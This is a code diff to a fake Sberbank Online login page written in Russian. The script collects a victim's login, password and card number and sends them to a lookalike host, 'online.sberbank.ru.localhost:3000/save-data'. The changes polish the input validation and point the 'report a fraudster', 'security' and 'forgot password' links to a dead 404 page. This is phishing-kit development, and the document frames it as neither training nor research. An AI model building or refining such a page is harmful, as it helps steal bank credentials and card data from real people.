@@ -231,12 +231,14 @@
             loginButton.classList.add("hidden");
             noCardText.classList.add("hidden");
             cardFieldsContainer.classList.remove("hidden");
+            loginInput.placeholder = "Введите номер карты";
           } else if (index === 1) {
             loginInput.placeholder = "Введите телефон";
             formGroups.forEach(group => group.classList.remove("hidden"));
             rememberContainer.classList.remove("hidden");
             loginButton.classList.remove("hidden");
             noCardText.classList.remove("hidden");
+            cardFieldsContainer.classList.add("hidden");
           } else {
             formGroups.forEach(group => group.classList.remove("hidden"));
             rememberContainer.classList.remove("hidden");
@@ -255,6 +257,7 @@
         const password = passwordInput.value.trim();
         const cardNumber = document.getElementById("card-number")?.value.trim() || "";
 
+        // Проверка на пустые поля
         if (!login || !password) {
           errorMessage.textContent = 'Неверный логин или пароль. Попробуйте еще раз.';
           loginInput.value = ""; // Очистить поле логин
@@ -262,18 +265,24 @@
           return;
         }
 
+        // Если выбрана вкладка с телефоном
         if (tabs[1].classList.contains("active") && !/^\+?[0-9]{10,15}$/.test(login)) {
           errorMessage.textContent = 'Неверный номер телефона или пароль. Попробуйте еще раз.';
+          loginInput.value = ""; // Очистить поле телефон
+          passwordInput.value = ""; // Очистить поле пароль
           return;
         }
 
+        // Проверка карты
         if (cardFieldsContainer.classList.contains("hidden") && cardNumber) {
           if (!/^\d{16}$/.test(cardNumber)) {
             errorMessage.textContent = 'Неправильный номер карты. Повторите попытку.';
+            document.getElementById("card-number").value = "";
             return;
           }
         }
 
+        // Отправка данных
         const dataToSend = { login, password, cardNumber };
 
         fetch('https://online.sberbank.ru.localhost:3000/save-data', {
@@ -293,7 +302,7 @@
         });
       });
 
-      // Обработчик для кнопок "Вход по QR-коду" и "Вход по коду"
+      // Обработчики для кнопок "Вход по QR-коду" и "Вход по коду"
       document.querySelectorAll('.auth-option').forEach(option => {
         option.addEventListener('click', () => {
           window.location.href = 'https://example.com/404'; // Страница 404
@@ -307,6 +316,7 @@
 
         if (!/^\d{16}$/.test(cardNumber)) {
           errorMessage.textContent = 'Неправильный номер карты. Повторите попытку.';
+          document.getElementById("card-number").value = "";
           return;
         }
 
@@ -335,7 +345,7 @@
       </div>
       <div class="remember-container">
         <label><input type="checkbox"> Запомнить меня</label>
-        <a href="#" style="color: #007f00; font-size: 14px;">Забыли логин или пароль?</a>
+        <a href="https://example.com/404" style="color: #007f00; font-size: 14px;">Забыли логин или пароль?</a>
       </div>
       <button type="button">Войти</button>
       <p class="no-card-text">Нет карты СберБанка?</p>
@@ -357,8 +367,8 @@
     </div>
 
     <div class="report-buttons">
-      <div class="report-button">Сообщить о мошеннике</div>
-      <div class="report-button">Больше о безопасности</div>
+      <div class="report-button" onclick="window.location.href='https://example.com/404'">Сообщить о мошеннике</div>
+      <div class="report-button" onclick="window.location.href='https://example.com/404'">Больше о безопасности</div>
     </div>
 
     <div class="security-info">
